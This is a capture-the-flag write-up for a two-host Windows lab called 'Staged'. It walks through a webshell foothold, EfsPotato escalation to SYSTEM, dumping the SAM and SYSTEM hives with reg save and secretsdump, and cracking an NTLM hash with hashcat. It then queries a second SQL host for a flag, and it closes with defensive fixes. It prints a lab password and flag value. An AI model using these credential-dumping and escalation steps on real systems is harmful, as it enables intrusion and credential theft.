What you need to know

  • Windows webshells and reverse shells
  • SeImpersonate and potato tools (EfsPotato)
  • Offline NTLM crack with hashcat or john
  • PHP mysqli from the web host to a second SQL host

Main idea

Own the web worker. Rise to SYSTEM. Crack the next human account. Query the SQL host that holds the real flag.

Story

Staged uses two hosts. Take the Windows web host as j.smith. Escalate with EfsPotato. Dump and crack NTLM for p.richardson. From the web host, open MySQL on sqlsrv.hacksmarter. Read hacksmarter_db.final_config.admin_api_token.

Why it works

The web identity has SeImpersonate. Local dump gives NTLM that you can crack. SQL trusts the web path enough to expose the final secret. SYSTEM on the web host is not the end. 

webshell as j.smith (SeImpersonate)
  → Go reverse shell + EfsPotato → SYSTEM
  → reg save SAM/SYSTEM → secretsdump
  → crack p.richardson → ^^CThacker66
  → PHP mysqli → 10.1.118.5
  → hacksmarter_db.final_config → admin_api_token

Step 1: Web foothold as j.smith

Why: You need code run as a user with impersonation rights. Check rights at once.
# get or plant webshell on web.hacksmarter (10.1.107.112)
# move to a Go reverse shell if the shell is weak
whoami /all
# expect SeImpersonatePrivilege

Step 2: EfsPotato to SYSTEM

Why: SeImpersonate maps to SYSTEM for many service style identities.
# run EfsPotato from the reverse shell
# whoami → nt authority\system

Step 3: Dump local secrets

Why: Offline hives give local NTLM without more remote noise.
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
# copy to Kali
secretsdump.py -sam sam.save -system system.save LOCAL

Step 4: Crack p.richardson

Why: Some paths need a clear password, not only NTLM.
hashcat -m 1000 pr.hash /usr/share/wordlists/rockyou.txt
# or john --format=NT
# result: p.richardson → ^^CThacker66

Step 5: MySQL from web host, final flag

Why: The flag is not on the web desktop. It sits on SQL as an API token row.
# from web host (PHP mysqli or mysql client)
# host: 10.1.118.5 (sqlsrv.hacksmarter)
# database: hacksmarter_db
# table: final_config → column admin_api_token
FLAG{b64f49553d5c441652e95697a2c5949e}

Impact

  • Web code run to full SYSTEM
  • Password reuse into the SQL tier
  • API token (flag) read after one cracked user

Fix

  • Remove SeImpersonate from web workers when possible.
  • Block potato style abuse. Alert on reg save of SAM and SYSTEM.
  • Use strong unique passwords. Treat dumps as cracked.
  • Segment SQL. Least privilege DB users. Do not store final secrets for the web identity.
  • Alert on rare MySQL from IIS workers if that is not normal app traffic.

Extra notes

  • Web code run is not the end when secrets live on host two.
  • Path: SeImpersonate → SYSTEM → hives → NTLM → password → SQL row.
  • Ops: ~/htb/staged/ATTACK_LOG.md, loot/FLAG.txt, hives

Close

Staged teaches two host thinking. Potato and dump are the middle. The real prize sat one hop further on SQL.
